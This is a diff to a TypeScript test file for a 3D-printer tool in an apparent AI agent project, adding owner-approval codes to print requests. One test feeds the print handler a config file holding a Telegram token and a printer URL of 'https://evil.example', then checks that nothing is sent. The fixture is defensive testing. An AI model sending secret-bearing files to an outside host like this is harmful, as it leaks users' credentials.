@@ -11,11 +11,13 @@ vi.mock('node:child_process', async (original) => ({ ...(await original() as obj
 import { printerTools } from './3dprinter.js'
 import { printerPrintTool, printerStatusTool } from './printer-tool.js'
 import { withExecutionPolicyContext } from '../core/lifecycle-policy.js'
+import { ownerApprovalCode } from '../test-utils/owner-approval.js'
+import { approvalDetailOf } from './owner-approval.js'
 
 const fetchMock = vi.fn()
 beforeEach(() => { fetchMock.mockReset(); child.spawn.mockClear(); vi.stubGlobal('fetch', fetchMock) })
 afterEach(() => vi.unstubAllGlobals())
-const approved = <T>(work: () => T) => withExecutionPolicyContext({ authUserId: 'owner-1', channel: 'telegram', approvalGranted: true }, work)
+const approved = <T>(work: () => T) => withExecutionPolicyContext({ authUserId: 'owner-1', channel: 'telegram' }, work)
 const tool = (name: string) => printerTools.find(entry => entry.name === name)!
 
 describe('R2 T10: physical printer actions only with owner approval', () => {
@@ -45,7 +47,7 @@ describe('R2 T9: printer-tool builds no shell strings and uploads only G-code', 
         const dir = mkdtempSync(join(tmpdir(), 'gcode-'))
         const config = join(dir, 'xaventra.config.json')
         writeFileSync(config, '{"telegram":{"token":"secret"}}')
-        const result = await approved(() => printerPrintTool.handler({ printerUrl: 'https://evil.example', gcodeFile: config, apiKey: 'x' })) as any
+        const result = await approved(() => printerPrintTool.handler({ printerUrl: 'https://evil.example', gcodeFile: config, apiKey: 'x', confirm: ownerApprovalCode('printer_print', config) })) as any
         expect(result.success).toBe(false)
         expect(fetchMock).not.toHaveBeenCalled()
     })
@@ -67,7 +69,7 @@ describe('R2 T18: honest print result and a single printer_status', () => {
         writeFileSync(gcode, 'G28\n')
         fetchMock.mockResolvedValueOnce(new Response('ok', { status: 201 }))
         fetchMock.mockResolvedValueOnce(new Response('conflict', { status: 409 }))
-        const result = await approved(() => printerPrintTool.handler({ printerUrl: 'http://192.0.2.5', gcodeFile: gcode, apiKey: 'k' })) as any
+        const result = await approved(() => printerPrintTool.handler({ printerUrl: 'http://192.0.2.5', gcodeFile: gcode, apiKey: 'k', confirm: ownerApprovalCode('printer_print', gcode) })) as any
         expect(result.success).toBe(false)
         expect(JSON.parse(fetchMock.mock.calls[1][1].body)).toEqual({ command: 'start' })
     })
